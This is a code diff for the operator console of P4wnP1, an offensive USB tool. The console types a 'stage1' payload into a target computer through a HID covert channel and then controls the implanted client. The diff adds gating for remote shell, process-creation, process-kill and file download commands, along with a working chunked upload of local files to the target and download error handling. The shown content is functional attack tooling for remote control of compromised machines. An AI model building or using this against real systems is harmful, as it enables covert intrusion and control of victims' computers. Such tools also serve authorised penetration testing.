@@ -76,6 +76,8 @@ class P4wnP1(cmd.Cmd):
 		
 		# register Listener for LinkLayer signals to upper layers (to receive LinkLayer connection events)
 		dispatcher.connect(self.signal_handler_transport_layer, sender="TransportLayerUp")
+		
+		self.client_connected_commands = ["ls", "pwd", "cd", "shell", "CreateProc", "interact", "download", "upload", "echotest", "GetClientProcs", "KillClient", "KillProc"]
 		self.setPrompt(False, False)
 		cmd.Cmd.__init__(self)
 		
@@ -91,6 +93,23 @@ Enter "FireStage1" to run stage 1 against the current target.
 Use "help FireStage1" to get more details.
 =================================
 '''
+		
+	def precmd(self, line):
+		cmd, args, remain = self.parseline(line)
+		if not cmd:
+			return line
+		if cmd in self.client_connected_commands:
+			if not self.client.isConnected():
+				print ""
+				print "Command '{0}' could only be called with a client connected.".format(cmd)
+				print "--------------------------------------------------------------"
+				print ""
+				print "Use 'SetKeyboardLanguage' to switch to your targtes keyboard"
+				print "layout and run 'FireStage1' to connect via HID covert channel."
+				print "--------------------------------------------------------------"
+				print ""
+				return ""		
+		return line
 
 	def setPrompt(self, connectState,  reprint = True):
 		if connectState:
@@ -666,8 +685,11 @@ Use "help FireStage1" to get more details.
 		hideTargetWindow = True
 		if "nohide" in line.lower():
 			hideTargetWindow = False
+			
+		print "Starting to type out stage1 to the target..."
 		self.stage1_trigger(trigger_type=trigger_type, trigger_delay_ms=trigger_delay_ms, hideTargetWindow = hideTargetWindow)	
-				
+		print "...done. If the client doesn't connect back, check the target"
+		print "keyboard layout with 'SetKeyboardLanguage'"
 		
 	def do_SetKeyboardLanguage(self, line):
 		'''
@@ -854,19 +876,7 @@ Use "help FireStage1" to get more details.
 			print l
 			
 
-	# REMOVE, obsolete
-	def client_call_create_file_channel(self, remote_filename, remote_file_accessmode, remote_file_target, force=False):
-		# remote_file_target: 0=disc, 1=in_memory
-		force_val = 0
-		if force:
-			force_val = 1
-		method_args = struct.pack("!{0}sx{1}sxBB".format(len(remote_filename), len(remote_file_accessmode)), remote_filename, remote_file_accessmode, remote_file_target, force_val)
-			
-		# we could use the create proc handler
-		return self.client.callMethod("core_create_filechannel", method_args, self.handler_pass_through_result, error_handler=self.handler_pass_through_result, waitForResult = True, deliverResult = True)
-	
-	def client_call_open_file(self, remote_filename, remote_filemode, remote_fileaccess):
-				
+	def client_call_open_file(self, remote_filename, remote_filemode, remote_fileaccess):			
 		method_args = struct.pack("!{0}sxBB".format(len(remote_filename)), remote_filename, remote_filemode, remote_fileaccess)
 			
 		# we could use the create proc handler
@@ -937,8 +947,18 @@ Use "help FireStage1" to get more details.
 		else:
 			print "wrong argument count"
 			return
+		
+		
+		sourcefile =  None
+		# try to open local file first
+		try:
+			sourcefile = FileSystem.open_local_file(source_path, FileMode.Open, FileAccess.Read)
+		except Exception as e:
+			print e.message
+			return
+		
 			
-		print "Uploading local file {0} to remote file {1}".format(source_path, target_path)
+		
 		
 		# Try to open remote file
 		success, result = self.client_call_open_file(remote_filename = target_path, 
@@ -967,6 +987,8 @@ Use "help FireStage1" to get more details.
 			else:
 				return
 		
+		print "Uploading local file {0} to remote file {1}".format(source_path, target_path)
+		
 		# if we are here, file open succeeded and we request a channel for the filestream
 		stream_channel = None
 		success, result = self.client_call_open_stream_channel(stream_id)
@@ -986,12 +1008,29 @@ Use "help FireStage1" to get more details.
 			# ToDo: Remote stream should be destroyed
 			return
 		
+		starttime =  time.time()
+		
 		# if here, we should have a valid stream_channel
 		# inform client that the channel has link
 		self.client_call_inform_channel_added(stream_channel)
 		
-		stream_channel.Write("Test")
+		# copy data to upload file in chunks
+		chunksize = 30000
+		readcount = -1
+		while readcount !=  0:
+			readen = sourcefile.read(chunksize)
+			readcount =  len(readen)
+			stream_channel.Write(readen)
+			sys.stdout.write(".")
 		stream_channel.Flush()
+		
+		# request stream close
+		stream_channel.Close()
+		endtime =  time.time()
+		
+		print "Upload of '{0}' finished in {1:4.2f} seconds".format(source_path, endtime - starttime)
+		
+		# close file
 		
 	def do_download(self, line):
 		args = line.split(" ")
@@ -1064,8 +1103,13 @@ Use "help FireStage1" to get more details.
 
 		count = -1
 		while count != 0:
-			readen = stream_channel.Read(50)
-			count =  len(readen)
+			try:
+				readen = stream_channel.Read(50)
+				count =  len(readen)
+			except ChannelException as e:
+				print(e.__str__())
+				return # abort further reading
+			# here we have the result of a single read
 			print "readtest, content:\n==================\n\n {0} ".format(readen)
 		
 		# close remote stream
